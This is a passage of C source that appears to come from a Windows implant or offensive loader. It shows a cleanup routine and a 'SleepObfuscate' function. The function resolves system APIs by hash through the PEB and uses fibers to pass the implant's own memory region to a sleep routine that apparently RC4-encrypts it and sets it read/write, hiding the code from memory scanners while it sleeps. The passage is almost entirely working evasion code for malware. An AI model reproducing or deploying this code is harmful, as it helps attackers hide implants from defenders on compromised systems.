		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, St2 );
		St2 = NULL;
	};
	if ( Res != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Res );
		Res = NULL;
	};
	if ( Dec != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Dec );
		Dec = NULL;
	};
	if ( Blk != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Blk );
		Blk = NULL;
	};
	if ( St1 != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, St1 );
		St1 = NULL;
	};
	if ( Gt1 != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Gt1 );
		Gt1 = NULL;
	};
	if ( Enc != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Enc );
		Enc = NULL;
	};
	if ( Set != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Set );
		Set = NULL;
	};
	if ( Beg != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Beg );
		Beg = NULL;
	};
	if ( Spf != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Spf );
		Spf = NULL;
	};
	if ( Cap != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Cap );
		Cap = NULL;
	};
	if ( Ini != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ini );
		Ini = NULL;
	};
	if ( Src != NULL ) {
		Api.NtClose( Src );
		Src = NULL;
	};
	if ( Thd != NULL ) {
		Api.NtTerminateThread( Thd, STATUS_SUCCESS );
		Api.NtClose( Thd );
		Thd = NULL;
	};
	if ( Evt != NULL ) {
		Api.NtClose( Evt );
		Evt = NULL;
	};
	if ( Adv != NULL ) {
		Api.LdrUnloadDll( Adv );
		Adv = NULL;
	};
	if ( K32 != NULL ) {
		Api.LdrUnloadDll( K32 );
		K32 = NULL;
	};
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Rc4, sizeof( Rc4 ) );

	Fbr->SwitchToFiber( Fbr->Master );
};

/*!
 *
 * Purpose:
 *
 * Sets up a temporary stack for the call to avoid
 * using up too much memory. Leverages Sleep_Fiber
 * to obfuscate the current thread and set it to
 * R/W
 *
!*/
D_SEC( B ) VOID WINAPI SleepObfuscate( _In_ ULONG Timeout )
{
	F_PARAM		Fbr;
	UNICODE_STRING	Uni;

	PVOID		K32 = NULL;

	RtlSecureZeroMemory( &Fbr, sizeof( Fbr ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	Fbr.RtlInitUnicodeString = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Fbr.LdrUnloadDll         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Fbr.LdrLoadDll           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );

	Fbr.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"kernel32.dll" ) ) );
	Fbr.LdrLoadDll( NULL, 0, &Uni, &K32 );

	if ( K32 != NULL ) {
		Fbr.ConvertThreadToFiber = PeGetFuncEat( K32, H_API_CONVERTTHREADTOFIBER );
		Fbr.ConvertFiberToThread = PeGetFuncEat( K32, H_API_CONVERTFIBERTOTHREAD );
		Fbr.SwitchToFiber        = PeGetFuncEat( K32, H_API_SWITCHTOFIBER );
		Fbr.DeleteFiber          = PeGetFuncEat( K32, H_API_DELETEFIBER );
		Fbr.CreateFiber          = PeGetFuncEat( K32, H_API_CREATEFIBER );

		if ( ( Fbr.Master = Fbr.ConvertThreadToFiber( &Fbr ) ) ) {
			if ( ( Fbr.Slave = Fbr.CreateFiber( 0x1000 * 6, C_PTR( G_PTR( Sleep_Call ) ), &Fbr ) ) ) {
				Fbr.Time   = Timeout;
				Fbr.Buffer = C_PTR( G_PTR( Start ) );
				Fbr.Length = U_PTR( U_PTR( G_END() ) - U_PTR( G_PTR( Start ) ) );
				Fbr.SwitchToFiber( Fbr.Slave );
				Fbr.DeleteFiber( Fbr.Slave );
			};
			Fbr.ConvertFiberToThread();
		};
		Fbr.LdrUnloadDll( K32 );
	};

	RtlSecureZeroMemory( &Fbr, sizeof( Fbr ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
};
